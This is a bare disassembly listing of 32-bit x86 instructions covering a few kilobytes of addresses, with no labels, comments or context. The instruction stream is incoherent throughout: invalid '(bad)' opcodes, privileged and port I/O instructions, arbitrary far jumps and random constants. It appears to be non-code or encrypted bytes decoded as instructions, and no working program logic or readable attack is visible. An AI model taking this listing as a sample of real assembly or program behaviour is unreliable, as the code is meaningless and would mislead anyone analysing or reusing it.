  415be7:	stos   BYTE PTR es:[edi],al
  415be8:	jne    0x415ba6
  415bea:	dec    edx
  415beb:	xor    eax,0x8d62c3ed
  415bf0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415bf1:	xchg   ebx,eax
  415bf2:	icebp  
  415bf3:	enter  0x7d93,0xf5
  415bf7:	adc    DWORD PTR [eax+0x39],edx
  415bfa:	int    0x13
  415bfc:	pop    ebx
  415bfd:	xor    BYTE PTR [ebx+0x47],bl
  415c00:	sub    cl,bl
  415c02:	jb     0x415c63
  415c04:	popf   
  415c05:	jnp    0x415be8
  415c07:	xchg   ebp,eax
  415c08:	mov    ds:0x6de41e20,eax
  415c0d:	mov    edx,0xe472eb4a
  415c12:	jmp    0x7f1f:0x5247522f
  415c19:	jae    0x415bea
  415c1b:	pop    ecx
  415c1c:	inc    eax
  415c1d:	(bad)  ds:0x3aa84ad7
  415c23:	repz test dh,0x42
  415c27:	mov    fs,WORD PTR [edx+esi*1]
  415c2a:	xor    al,ch
  415c2c:	mov    ebp,0xf4326424
  415c31:	push   ecx
  415c32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c33:	mov    esp,0x6a274151
  415c38:	les    edi,FWORD PTR [edx]
  415c3a:	mov    ds:0xa8ac599c,eax
  415c3f:	fadd   QWORD PTR es:[ecx+0x236726cd]
  415c46:	jmp    0x5641:0xe0e59888
  415c4d:	das    
  415c4e:	xlat   BYTE PTR ds:[ebx]
  415c4f:	adc    al,0xdb
  415c51:	push   eax
  415c52:	dec    ebp
  415c53:	lock rcl BYTE PTR [ecx-0x22],cl
  415c57:	js     0x415ca2
  415c59:	push   ebp
  415c5a:	mov    ah,BYTE PTR [ebp-0x61a2d812]
  415c60:	sub    ecx,DWORD PTR [edx+edi*8-0x176f8c17]
  415c67:	dec    esi
  415c68:	sub    DWORD PTR [ebp+0x44b36446],ebp
  415c6e:	sub    BYTE PTR [esi+0x57],0xa6
  415c72:	mov    WORD PTR [edi-0x76ea2601],cs
  415c78:	mov    ebx,0xfe240455
  415c7d:	sbb    eax,0xa90a3e13
  415c82:	mov    dl,0x4a
  415c84:	cli    
  415c85:	pop    ds
  415c86:	mov    ah,0x91
  415c88:	arpl   bx,bp
  415c8a:	cwde   
  415c8b:	pop    ds
  415c8c:	jmp    0x6a76:0x2f7ab14
  415c93:	push   edx
  415c94:	inc    edx
  415c95:	push   edi
  415c96:	addr16 je 0x415d0c
  415c99:	jmp    0x70ad:0xbb917dcf
  415ca0:	iret   
  415ca1:	ins    BYTE PTR es:[edi],dx
  415ca2:	xchg   edi,eax
  415ca3:	inc    ebx
  415ca4:	retf   
  415ca5:	xchg   DWORD PTR [esi+0x11f1da77],edx
  415cab:	jp     0x415cef
  415cad:	les    edi,FWORD PTR [esi]
  415caf:	mov    ah,0x9f
  415cb1:	dec    ebp
  415cb2:	push   edi
  415cb3:	jb     0x415cc3
  415cb5:	sub    esi,DWORD PTR [ecx+0x1f]
  415cb8:	cs sbb eax,0x778fc12e
  415cbe:	mov    eax,ds:0x99f78e65
  415cc3:	mov    ecx,0xe26e4d61
  415cc8:	pushf  
  415cc9:	cmp    eax,0x1bf3601
  415cce:	dec    eax
  415ccf:	int    0x13
  415cd1:	xchg   ebp,eax
  415cd2:	adc    DWORD PTR [ebp+0xe0cf8a1],ecx
  415cd8:	jg     0x415cc2
  415cda:	mov    eax,0x2df7caf7
  415cdf:	iret   
  415ce0:	dec    eax
  415ce1:	adc    bl,bh
  415ce3:	(bad)  
  415ce4:	mov    eax,0x63441729
  415ce9:	repz push esp
  415ceb:	inc    eax
  415cec:	and    edx,ebp
  415cee:	dec    eax
  415cef:	sbb    eax,0xa1e096a6
  415cf4:	or     eax,0xd36e968f
  415cf9:	or     BYTE PTR [ecx*1+0x1c0a191d],al
  415d00:	jmp    0x4fd2:0x850f3047
  415d07:	or     cl,BYTE PTR [eax+0x20427401]
  415d0d:	loop   0x415ce1
  415d0f:	inc    esp
  415d10:	nop
  415d11:	inc    edi
  415d12:	xchg   edi,eax
  415d13:	xchg   ecx,eax
  415d14:	push   di
  415d16:	jns    0x415d30
  415d18:	(bad)  
  415d19:	mov    cl,0x84
  415d1b:	xchg   esp,eax
  415d1c:	xchg   esp,eax
  415d1d:	dec    ebx
  415d1e:	inc    esi
  415d1f:	data16 or cl,BYTE PTR [eax-0x5c]
  415d23:	jg     0x415d3b
  415d25:	out    dx,al
  415d26:	(bad)  
  415d27:	fmul   DWORD PTR [eax+ebp*1+0x1d]
  415d2b:	shl    DWORD PTR [ebx],cl
  415d2d:	push   0x6e
  415d2f:	mov    al,BYTE PTR [esi+0x30]
  415d32:	mov    cl,0xe6
  415d34:	fild   QWORD PTR [ecx+0x34]
  415d37:	lock fwait
  415d39:	outs   dx,BYTE PTR ds:[esi]
  415d3a:	(bad)  
  415d3b:	popf   
  415d3c:	out    0x89,al
  415d3e:	dec    ecx
  415d3f:	mov    BYTE PTR ds:0xd360266c,ch
  415d45:	dec    esi
  415d46:	stos   BYTE PTR es:[edi],al
  415d47:	jecxz  0x415d91
  415d49:	sbb    BYTE PTR [ebx-0x9],0x6a
  415d4d:	hlt    
  415d4e:	paddusw mm6,QWORD PTR [esi]
  415d51:	(bad)  
  415d52:	retf   
  415d53:	xchg   DWORD PTR [esi-0x7d],edi
  415d56:	cmp    eax,0x81819ede
  415d5b:	sub    ebx,edi
  415d5d:	sar    DWORD PTR [ecx],1
  415d5f:	rol    BYTE PTR [eax],cl
  415d61:	nop
  415d62:	stc    
  415d63:	hlt    
  415d64:	inc    eax
  415d65:	in     eax,0xb5
  415d67:	repnz int 0x2f
  415d6a:	jae    0x415d3c
  415d6c:	in     al,dx
  415d6d:	adc    DWORD PTR [edx+eiz*1-0x74897d69],0xe3caf5e6
  415d78:	sub    ch,BYTE PTR ds:0x14e547bc
  415d7e:	cli    
  415d7f:	repz imul ebx,DWORD PTR [eax],0xffffff88
  415d83:	add    al,ah
  415d85:	ins    BYTE PTR es:[edi],dx
  415d86:	adc    dh,BYTE PTR [edx-0xa916d1e]
  415d8c:	or     dl,BYTE PTR [esi+0x60d768bc]
  415d92:	fucom  st(6)
  415d94:	call   edi
  415d96:	mov    ebp,0xc49be0d7
  415d9b:	push   es
  415d9c:	fimul  WORD PTR [esi+0x58]
  415d9f:	ja     0x415d7e
  415da1:	and    BYTE PTR [ebx-0x34],0xa0
  415da5:	retf   0x9481
  415da8:	add    esi,edi
  415daa:	mov    cl,dl
  415dac:	adc    BYTE PTR [edx],dh
  415dae:	pop    es
  415daf:	ret    0x3c84
  415db2:	mov    ds,WORD PTR fs:[ecx-0x567366b4]
  415db9:	mov    al,0x51
  415dbb:	xchg   DWORD PTR [ebp+0x4bc664e],ecx
  415dc1:	jnp    0x415d78
  415dc3:	jg     0x415e01
  415dc5:	and    bh,al
  415dc7:	push   ds
  415dc8:	push   esi
  415dc9:	adc    DWORD PTR cs:[edx+0x40],edx
  415dcd:	push   ebp
  415dce:	mov    bl,BYTE PTR [edx+edx*4]
  415dd1:	jmp    0x5176168b
  415dd6:	test   DWORD PTR [ebx],0x4121928
  415ddc:	fistp  DWORD PTR [ebp-0x279e2e94]
  415de2:	lds    esi,FWORD PTR [esi-0x7b]
  415de5:	mov    DWORD PTR [ebx+edx*2],esi
  415de8:	ins    DWORD PTR es:[edi],dx
  415de9:	out    0xcd,al
  415deb:	xchg   edi,eax
  415dec:	test   BYTE PTR [ecx+0x36],cl
  415def:	shl    DWORD PTR [ecx-0x40],0x59
  415df3:	ins    DWORD PTR es:[edi],dx
  415df4:	lea    esi,[ebx-0x3c]
  415df7:	mov    dh,0x29
  415df9:	stos   DWORD PTR es:[edi],eax
  415dfa:	add    DWORD PTR [edx],edx
  415dfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415dfd:	jno    0x415e54
  415dff:	hlt    
  415e00:	imul   eax,DWORD PTR [esi-0xb],0xa
  415e04:	pushf  
  415e05:	mov    dl,0xab
  415e07:	push   esi
  415e08:	add    eax,0x9363c317
  415e0d:	lock mov ds:0xe5ee9429,eax
  415e13:	loop   0x415df0
  415e15:	inc    ebp
  415e16:	ud0    esp,ebp
  415e19:	add    eax,0xccff2933
  415e1e:	sbb    eax,0x830b5353
  415e23:	nop
  415e24:	shr    DWORD PTR [edi-0x78cd7a3d],0xc4
  415e2b:	mov    esp,0xa184a040
  415e30:	mov    edx,DWORD PTR [edi-0x6b]
  415e33:	push   eax
  415e34:	or     esp,DWORD PTR [edi+ebp*8]
  415e37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e38:	ins    BYTE PTR es:[edi],dx
  415e39:	jne    0x415eb2
  415e3b:	test   al,0x11
  415e3d:	mov    ds:0x153ba8a0,al
  415e42:	les    edx,FWORD PTR [ecx]
  415e44:	push   es
  415e45:	pop    esp
  415e46:	adc    eax,0x1799f8c5
  415e4b:	and    eax,0xbbdd65dc
  415e50:	mov    edi,0x66125b0c
  415e55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e56:	jns    0x415dfd
  415e58:	cmp    al,0x2d
  415e5a:	rcl    BYTE PTR [esi],0x34
  415e5d:	mov    ds:0xb38f444b,al
  415e62:	call   0x27e3:0x942cd412
  415e69:	das    
  415e6a:	or     edx,esi
  415e6c:	sti    
  415e6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e6e:	imul   esi,DWORD PTR [ebx],0x3c
  415e71:	int3   
  415e72:	or     al,0xa2
  415e74:	xor    BYTE PTR [edi+0x17],bl
  415e77:	lds    ebp,FWORD PTR [eax-0x1452f702]
  415e7d:	clc    
  415e7e:	xor    DWORD PTR [ecx-0xfcd3268],ebp
  415e84:	in     al,0x7b
  415e86:	int    0x38
  415e88:	ds call 0x1da4b3d2
  415e8e:	jg     0x415e4a
  415e90:	sub    bl,dl
  415e92:	rol    dl,cl
  415e94:	or     al,0xea
  415e96:	xchg   esp,eax
  415e97:	inc    edx
  415e98:	icebp  
  415e99:	cmp    al,0xe2
  415e9b:	mov    ?,WORD PTR [ecx-0x52]
  415e9e:	jl     0x415ed3
  415ea0:	fwait
  415ea1:	mov    fs,WORD PTR [eax-0x1fd6d20b]
  415ea7:	imul   edi,DWORD PTR [edx+0x6e23722b],0xe224b1d4
  415eb1:	outs   dx,BYTE PTR ds:[esi]
  415eb2:	sahf   
  415eb3:	xchg   BYTE PTR [esi+0x486e3870],bl
  415eb9:	jo     0x415e92
  415ebb:	pop    eax
  415ebc:	mov    cl,0x7f
  415ebe:	test   BYTE PTR [edx+ebp*8],ch
  415ec1:	push   ss
  415ec2:	jns    0x415e6b
  415ec4:	mov    bl,0xf9
  415ec6:	and    ebx,ebp
  415ec8:	adc    al,0x4e
  415eca:	retf   
  415ecb:	mov    eax,ds:0x57a2d2d7
  415ed0:	adc    BYTE PTR [esi],bh
  415ed2:	(bad)  
  415ed4:	inc    esi
  415ed5:	data16 (bad) 
  415ed7:	fdivr  st(0),st
  415ed9:	dec    BYTE PTR [edx+0x5fa53d82]
  415edf:	adc    al,0xdf
  415ee1:	int    0x11
  415ee3:	clc    
  415ee4:	or     al,0xc6
  415ee6:	xor    al,0x17
  415ee8:	cmp    dl,BYTE PTR [edx+0x3a4b5a42]
  415eee:	loop   0x415ef9
  415ef0:	inc    ebp
  415ef1:	cmp    eax,0x13554b40
  415ef6:	out    dx,eax
  415ef7:	xchg   DWORD PTR [ebx+0x79],edx
  415efa:	lahf   
  415efb:	ret    
  415efc:	aas    
  415efd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415efe:	push   0xe5f68fa1
  415f03:	pusha  
  415f04:	adc    BYTE PTR [eax+0x3],cl
  415f07:	data16 cmp al,0x2c
  415f0a:	popf   
  415f0b:	xchg   esi,eax
  415f0c:	fdivr  st(0),st
  415f0e:	popa   
  415f0f:	jbe    0x415eb8
  415f11:	sub    eax,0x1e5d500f
  415f16:	push   esi
  415f17:	mov    esp,0x4433be74
  415f1c:	push   es
  415f1d:	jg     0x415eb2
  415f1f:	xor    edi,edx
  415f21:	repz rcr BYTE PTR [edx],cl
  415f24:	fild   QWORD PTR [ecx]
  415f26:	int    0xf1
  415f28:	sti    
  415f29:	xchg   ebx,eax
  415f2a:	fcmovbe st,st(5)
  415f2c:	aaa    
  415f2d:	pop    esp
  415f2e:	inc    esi
  415f2f:	cld    
  415f30:	scas   eax,DWORD PTR es:[edi]
  415f31:	and    DWORD PTR [ebp+0xa],edx
  415f34:	fwait
  415f35:	mov    BYTE PTR [ecx],dh
  415f37:	enter  0x482b,0x52
  415f3b:	xchg   edi,eax
  415f3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f3d:	mov    esi,0x11c71d8f
  415f42:	in     al,0xdb
  415f44:	mov    ebx,0x77b1691
  415f49:	adc    DWORD PTR [ebx],0x6c
  415f4c:	cmp    eax,0x2084f085
  415f51:	dec    edx
  415f52:	loop   0x415f7d
  415f54:	fcom   DWORD PTR [ebx+edx*8-0x144923ba]
  415f5b:	cli    
  415f5c:	sbb    ebx,DWORD PTR [eax+0xac9eb02]
  415f62:	(bad)  
  415f63:	pop    ss
  415f64:	fmul   st,st(7)
  415f66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f67:	or     DWORD PTR [eax],esi
  415f69:	xchg   esp,eax
  415f6a:	rcl    DWORD PTR [ebp-0x5d35291f],cl
  415f70:	or     cl,BYTE PTR [edx-0x232fd716]
  415f76:	jns    0x415f6c
  415f78:	out    dx,al
  415f79:	pop    edi
  415f7a:	int3   
  415f7b:	call   FWORD PTR [edi-0x7e]
  415f7e:	fisubr WORD PTR [ecx+0x8]
  415f81:	push   ebx
  415f82:	outs   dx,BYTE PTR ds:[esi]
  415f83:	lds    ecx,FWORD PTR [esi]
  415f85:	mov    eax,0x56fb29cf
  415f8a:	gs int 0xdf
  415f8d:	push   ebp
  415f8e:	mov    cl,0xa7
  415f90:	mov    esp,DWORD PTR [ebx]
  415f92:	stc    
  415f93:	(bad)  
  415f94:	ss popa 
  415f96:	mov    ch,0xee
  415f98:	xchg   edi,eax
  415f99:	ins    BYTE PTR es:[edi],dx
  415f9a:	jbe    0x415f89
  415f9c:	dec    ecx
  415f9d:	and    eax,0xd077e407
  415fa2:	dec    edx
  415fa3:	fwait
  415fa4:	daa    
  415fa5:	jb     0x415f46
  415fa7:	ds lahf 
  415fa9:	mov    bh,0xb1
  415fab:	mov    ds:0x711c3eee,eax
  415fb0:	pushf  
  415fb1:	inc    ecx
  415fb2:	push   ebx
  415fb3:	push   cs
  415fb4:	outs   dx,BYTE PTR ds:[esi]
  415fb5:	popf   
  415fb6:	jo     0x415fca
  415fb8:	sti    
  415fb9:	push   ebp
  415fba:	fisubr DWORD PTR [ebx+0x47c82d8c]
  415fc0:	pop    ss
  415fc1:	dec    ecx
  415fc2:	jo     0x415f54
  415fc4:	or     BYTE PTR [ebp-0x64],cl
  415fc7:	cmc    
  415fc8:	call   0xbc9b:0x8e2fd98
  415fcf:	cmp    ebx,DWORD PTR ds:0x949e1286
  415fd5:	xchg   edi,eax
  415fd6:	pop    eax
  415fd7:	mov    dh,0x36
  415fd9:	cmp    DWORD PTR [edi+0x4db33f8],ecx
  415fdf:	aaa    
  415fe0:	jecxz  0x415f8f
  415fe2:	xchg   si,ax
  415fe4:	add    ch,bl
  415fe6:	sar    DWORD PTR [edx-0x73eb04a8],1
  415fec:	(bad)  
  415fed:	pop    es
  415fee:	scas   eax,DWORD PTR es:[edi]
  415fef:	push   ecx
  415ff0:	jae    0x41606e
  415ff2:	push   ss
  415ff3:	lods   eax,DWORD PTR ds:[esi]
  415ff4:	and    ecx,ebx
  415ff6:	push   edi
  415ff7:	and    DWORD PTR [edx+ebx*2+0x70],ebp
  415ffb:	jne    0x416054
  415ffd:	mov    cl,0x71
  415fff:	stc    
  416000:	xor    eax,ebx
  416002:	outs   dx,BYTE PTR ds:[esi]
  416003:	cli    
  416004:	ret    
  416005:	cmp    al,ah
  416007:	sbb    dl,cl
  416009:	aam    0x9e
  41600b:	dec    ebx
  41600c:	shr    BYTE PTR [ebx+0x510d46d],1
  416012:	dec    esp
  416013:	test   al,0x32
  416015:	in     eax,0xbb
  416017:	xlat   BYTE PTR ds:[ebx]
  416018:	jnp    0x41608a
  41601a:	jle    0x41605c
  41601c:	cmp    dh,dl
  41601e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41601f:	cdq    
  416020:	rcl    DWORD PTR [edx],cl
  416022:	and    al,BYTE PTR [bp+si+0x2a]
  416026:	push   ebp
  416027:	test   DWORD PTR [eax],0xedb27e8a
  41602d:	jge    0x41606d
  41602f:	push   eax
  416030:	xor    BYTE PTR [edx+0x52],ch
  416033:	repnz xchg esp,eax
  416035:	cmp    ah,BYTE PTR [ecx-0x6d51ba68]
  41603b:	xchg   esi,eax
  41603c:	rol    DWORD PTR [esi-0x211a9973],0xe4
  416043:	rcl    ebx,0xc4
  416046:	(bad)
  416049:	mov    BYTE PTR [ebx+ebx*8],dh
  41604c:	mov    ecx,0x1f3cc837
  416051:	push   ebx
  416052:	jmp    DWORD PTR [edx]
  416054:	push   ds
  416055:	hlt    
  416056:	in     eax,0xdd
  416058:	repz add BYTE PTR fs:[edi],cl
  41605c:	inc    edx
  41605d:	jmp    0x41600d
  41605f:	out    0xda,al
  416061:	cli    
  416062:	jno    0x41602f
  416064:	add    al,0x9e
  416066:	call   0xf0270522
  41606b:	pusha  
  41606c:	icebp  
  41606d:	jae    0x416022
  41606f:	call   0xb7d8:0x6ac8517
  416076:	scas   al,BYTE PTR es:[edi]
  416077:	sub    ch,0xef
  41607a:	lea    edx,[ecx]
  41607c:	adc    ebx,DWORD PTR [ecx]
  41607e:	push   es
  41607f:	pop    es
  416080:	std    
  416081:	ret    0x5047
  416084:	int    0x96
  416086:	xchg   esi,eax
  416087:	sub    eax,0x54429720
  41608c:	xor    cl,BYTE PTR [ebp-0x4a94ec30]
  416092:	lods   al,BYTE PTR ds:[esi]
  416093:	xor    edi,DWORD PTR [eax+0x37]
  416096:	vmwrite ebp,esi
  416099:	(bad)
  41609d:	gs xchg ebx,eax
  41609f:	or     eax,0xf36716a3
  4160a4:	cs into 
  4160a6:	popa   
  4160a7:	jp     0x4160b7
  4160a9:	mov    ds:0x31f683a8,eax
  4160ae:	add    bl,dh
  4160b0:	cwde   
  4160b1:	data16 jl 0x4160b1
  4160b4:	stc    
  4160b5:	pop    ebp
  4160b6:	push   edi
  4160b7:	xchg   esp,eax
  4160b8:	fsubr  DWORD PTR [ebp+ecx*2+0x42329bf6]
  4160bf:	or     esp,DWORD PTR [esi+0xa]
  4160c2:	arpl   WORD PTR [eax-0xe],cx
  4160c5:	xor    al,0x77
  4160c7:	shl    DWORD PTR [ecx+ebp*4+0x4dcce101],1
  4160ce:	xlat   BYTE PTR ds:[ebx]
  4160cf:	push   esp
  4160d0:	pop    esp
  4160d1:	mov    ebx,0x66936929
  4160d6:	leave  
  4160d7:	mov    ch,dl
  4160d9:	mov    ecx,0xb1edaf76
  4160de:	aaa    
  4160df:	sub    DWORD PTR ds:0xc33ecea7,edi
  4160e5:	cld    
  4160e6:	enter  0xfe16,0x86
  4160ea:	mov    al,0x1c
  4160ec:	or     eax,0x5019d2ec
  4160f1:	lock out dx,eax
  4160f3:	jns    0x41615a
  4160f5:	shl    BYTE PTR [esi+0x15],cl
  4160f8:	fwait
  4160f9:	mov    edi,0xd2583a34
  4160fe:	lods   al,BYTE PTR ds:[esi]
  4160ff:	inc    eax
  416100:	daa    
  416101:	sti    
  416102:	fmul   DWORD PTR [ebp+0x6e9fe968]
  416108:	jns    0x416101
  41610a:	dec    esp
  41610b:	jle    0x416188
  41610d:	sub    bh,BYTE PTR [eax+eiz*1]
  416110:	popa   
  416111:	push   edi
  416112:	fcom   QWORD PTR [ebp+0x2dd17821]
  416118:	rcr    DWORD PTR [eax],0xe9
  41611b:	inc    BYTE PTR [edi-0x6222d936]
  416121:	imul   edi,DWORD PTR [esi],0x66
  416124:	push   cs
  416125:	xor    edi,edx
  416127:	push   0x17
  416129:	mov    al,ds:0x71879b55
  41612e:	pop    ebx
  41612f:	adc    esi,esi
  416131:	int    0xb3
  416133:	add    BYTE PTR [eax+0x6a],bh
  416136:	add    dl,BYTE PTR [edx-0x7fafe4f3]
  41613c:	jg     0x41619d
  41613e:	outs   dx,BYTE PTR ds:[esi]
  41613f:	mov    ds:0x90207bb4,al
  416144:	daa    
  416145:	test   BYTE PTR [eax+0x3602f87],0x4e
  41614c:	push   ebx
  41614d:	retf   
  41614e:	jbe    0x416147
  416150:	ins    DWORD PTR es:[edi],dx
  416151:	(bad)  
  416152:	xchg   esp,eax
  416153:	and    al,0x6e
  416155:	fs dec esi
  416157:	cwde   
  416158:	add    al,0xb
  41615a:	cmp    BYTE PTR [edi],dl
  41615c:	pop    ebx
  41615d:	jmp    FWORD PTR [esi+0x76c3c17e]
  416163:	jns    0x4160f2
  416165:	xchg   bl,dh
  416167:	stos   BYTE PTR es:[edi],al
  416168:	sbb    edi,DWORD PTR [ebx]
  41616a:	jnp    0x41617d
  41616c:	push   ds
  41616d:	push   edx
  41616e:	cwde   
  41616f:	ds mov ah,0x93
  416172:	shl    BYTE PTR [edi-0x1e],0x50
  416176:	sub    ah,dl
  416178:	push   0xffffff98
  41617a:	pop    es
  41617b:	dec    edx
  41617c:	adc    al,0xe6
  41617e:	outs   dx,DWORD PTR ds:[esi]
  41617f:	mov    edx,0x3fb822ed
  416184:	ror    dl,1
  416186:	pop    ebp
  416187:	add    edx,0x3ff2f0d
  41618d:	dec    ecx
  41618e:	mov    esp,0xe6b0a5ae
  416193:	in     eax,0xf2
  416195:	push   ecx
  416196:	es inc esp
  416198:	mov    al,0xaa
  41619b:	add    al,0xb1
  41619d:	xor    DWORD PTR [eax],0xc5bd7faf
  4161a3:	xchg   ebx,eax
  4161a4:	adc    esi,DWORD PTR [esi]
  4161a6:	mov    gs,WORD PTR [ecx+eiz*4]
  4161a9:	mov    al,0x65
  4161ab:	pop    edx
  4161ac:	ds nop
  4161ae:	jecxz  0x41621e
  4161b0:	ror    DWORD PTR [ebx+ebp*2-0x34],1
  4161b4:	int3   
  4161b5:	sub    DWORD PTR [ecx+0x28],0x14749d39
  4161bc:	(bad)  
  4161be:	les    esp,FWORD PTR [ebx]
  4161c0:	mov    ds:0xd01ce744,al
  4161c5:	fwait
  4161c6:	mov    ds:0xfc035ca5,eax
  4161cb:	push   ecx
  4161cc:	dec    ecx
  4161cd:	add    DWORD PTR [eax+0x4a484ee7],edi
  4161d3:	pop    ebp
  4161d4:	mov    WORD PTR [edi+0x5b],ds
  4161d7:	mov    DWORD PTR [eax],ecx
  4161d9:	popf   
  4161da:	jns    0x416249
  4161dc:	pop    esi
  4161dd:	loopne 0x41624b
  4161df:	popa   
  4161e0:	add    eax,0x35fb8da8
  4161e5:	jp     0x4161ba
  4161e7:	dec    esp
  4161e8:	mov    esi,0xd737d862
  4161ed:	sar    DWORD PTR [edx+ebp*2+0xdf81c6d],1
  4161f4:	mov    al,0x54
  4161f6:	push   esp
  4161f7:	fmul   QWORD PTR [edi+ebp*1+0x6b]
  4161fb:	ins    DWORD PTR es:[edi],dx
  4161fc:	scas   al,BYTE PTR es:[edi]
  4161fd:	jno    0x41624e
  4161ff:	pop    DWORD PTR ds:0xaba84655
  416205:	xchg   edi,eax
  416206:	in     eax,0xc
  416208:	dec    ecx
  416209:	popf   
  41620a:	ficom  WORD PTR [ebx+0x7dbbcd43]
  416210:	xor    eax,0xb1f3bb36
  416215:	inc    eax
  416216:	sub    BYTE PTR [ecx-0x1f],0xee
  41621a:	aad    0x64
  41621c:	mov    DWORD PTR [eax],ebp
  41621e:	or     bl,bh
  416220:	test   WORD PTR [ecx+0xfa40970],dx
  416227:	or     DWORD PTR [esi+0x4036ebce],ecx
  41622d:	stos   BYTE PTR es:[edi],al
  41622e:	test   al,0x45
  416230:	and    ch,BYTE PTR [esi-0x74de4de6]
  416236:	pushf  
  416237:	xchg   ebp,eax
  416238:	inc    ecx
  416239:	(bad)  
  41623a:	clc    
  41623b:	ret    0xef87
  41623e:	into   
  41623f:	sub    ebx,DWORD PTR [edi]
  416241:	pop    ecx
  416242:	leave  
  416243:	push   esi
  416244:	or     eax,DWORD PTR [edi+0x38]
  416247:	mov    esi,0x70573637
  41624c:	mov    esp,0x8c1868e4
  416251:	(bad)  
  416253:	dec    ebx
  416254:	mov    bl,0x66
  416256:	mov    dl,0xfa
  416258:	imul   ecx,DWORD PTR [edi-0x8adf241],0xffffff85
  41625f:	dec    edi
  416260:	inc    ecx
  416261:	pop    ecx
  416262:	jns    0x416210
  416264:	push   ecx
  416265:	push   ecx
  416266:	xchg   ebp,eax
  416267:	dec    esp
  416268:	and    bl,BYTE PTR [esi]
  41626a:	fwait
  41626b:	adc    al,0x60
  41626d:	cld    
  41626e:	xchg   ebp,eax
  41626f:	dec    edi
  416270:	iret   
  416271:	adc    DWORD PTR [eax],eax
  416273:	cmp    al,bh
  416275:	mov    edi,0x9e525111
  41627a:	shr    BYTE PTR [eax-0x2a3cbbf],0xa3
  416281:	xor    DWORD PTR [ebp+0x6e],edx
  416284:	sub    al,0xb5
  416286:	mov    bl,0xb6
  416288:	stos   BYTE PTR es:[edi],al
  416289:	mov    dl,0x90
  41628b:	daa    
  41628c:	cmp    dh,BYTE PTR [esi]
  41628e:	imul   edx,DWORD PTR [edi-0x151b64b9],0xe
  416295:	mov    edi,0x7c73bec0
  41629a:	pop    esi
  41629b:	cwde   
  41629c:	jmp    0x68c3:0xe4e4a76d
  4162a3:	out    0xf1,al
  4162a5:	bnd jle 0x416285
  4162a8:	clc    
  4162a9:	sar    BYTE PTR [edx+0x28622f96],cl
  4162af:	push   ecx
  4162b0:	lahf   
  4162b1:	jmp    0x416268
  4162b3:	jnp    0x4162ed
  4162b5:	mov    bh,cl
  4162b7:	icebp  
  4162b8:	push   cs
  4162b9:	jnp    0x416263
  4162bb:	rcr    BYTE PTR [edi+0x74fc3698],cl
  4162c1:	inc    esi
  4162c2:	stos   DWORD PTR es:[edi],eax
  4162c3:	repz test BYTE PTR [eax],cl
  4162c6:	mov    ecx,0xb67d9ad9
  4162cb:	xchg   ebp,eax
  4162cc:	popa   
  4162cd:	int    0xdc
  4162cf:	(bad)  
  4162d0:	mov    cl,0xee
  4162d2:	xchg   esp,ecx
  4162d4:	loopne 0x4162ff
  4162d6:	in     al,dx
  4162d7:	int    0xc0
  4162d9:	push   edx
  4162da:	addr16 jmp 0xecb6c80e
  4162e0:	inc    ebx
  4162e1:	daa    
  4162e2:	xchg   ebx,eax
  4162e3:	xor    edx,DWORD PTR [eax]
  4162e5:	retf   0x3cdf
  4162e8:	push   ebp
  4162e9:	int    0x3d
  4162eb:	xor    edx,edx
  4162ed:	cmp    DWORD PTR [esi-0x8],esi
  4162f0:	adc    DWORD PTR [ecx],edi
  4162f2:	and    dh,al
  4162f4:	and    DWORD PTR [edx-0x3c],eax
  4162f7:	dec    ecx
  4162f8:	xor    dl,BYTE PTR [ebx+0x75df0d96]
  4162fe:	pop    ebx
  4162ff:	jae    0x4162f3
  416301:	or     BYTE PTR [edi+0x40],al
  416304:	push   es
  416305:	stc    
  416306:	loopne 0x4162dd
  416308:	xor    dl,BYTE PTR [edx+edx*2]
  41630b:	shr    DWORD PTR [ebx+0x396f60f8],0x6e
  416312:	pop    ebp
  416313:	repnz mov cl,BYTE PTR [ebx-0x50896974]
  41631a:	push   es
  41631b:	and    BYTE PTR [eax],dh
  41631d:	pop    ebp
  41631e:	or     ebx,DWORD PTR [eax-0x7f]
  416321:	retf   0x34bf
  416324:	test   al,0xbe
  416326:	pop    ds
  416327:	enter  0x75e8,0x9f
  41632b:	add    eax,0x3a10a784
  416330:	cmp    bh,BYTE PTR [eax+0x17]
  416333:	inc    ebx
  416334:	int    0xf1
  416336:	fcomp  DWORD PTR [edi+0x60]
  416339:	pop    ebx
  41633a:	daa    
  41633b:	push   ss
  41633c:	mov    bl,0xb
  41633e:	pushf  
  41633f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416340:	fst    DWORD PTR [ebx]
  416342:	repz add esi,DWORD PTR [ecx-0x48]
  416346:	stos   DWORD PTR es:[edi],eax
  416347:	xchg   esp,eax
  416348:	or     BYTE PTR ds:0x767a1ee3,ch
  41634e:	inc    ecx
  41634f:	inc    ecx
  416350:	fs pop eax
  416352:	wrmsr  
  416354:	(bad)  
  416355:	stc    
  416356:	jmp    0x1241:0xc909e06c
  41635d:	xchg   edx,eax
  41635e:	inc    eax
  41635f:	jae    0x416359
  416361:	test   eax,0x31c3d782
  416366:	dec    eax
  416367:	out    dx,al
  416368:	int    0xf3
  41636a:	outs   dx,BYTE PTR ds:[esi]
  41636b:	mov    ch,0x40
  41636d:	je     0x416349
  41636f:	mov    dh,0x60
  416371:	push   edx
  416372:	pusha  
  416373:	add    ebp,eax
  416375:	rcr    BYTE PTR [ebx+ecx*4+0xe],cl
  416379:	dec    esp
  41637a:	push   esp
  41637b:	sbb    al,0x7e
  41637d:	mov    cl,0x6e
  41637f:	add    ebx,DWORD PTR [ebp-0x79b33b44]
  416385:	push   esp
  416386:	sub    esp,DWORD PTR [ebx+0x7ec92407]
  41638c:	mov    BYTE PTR [ecx+0x20],0xa1
  416390:	sahf   
  416391:	and    eax,edx
  416393:	cmp    ebx,esi
  416395:	int    0xab
  416397:	pop    esp
  416398:	pop    ecx
  416399:	sbb    esi,esi
  41639b:	fidivr WORD PTR [ebx+0x1f]
  41639e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41639f:	out    dx,al
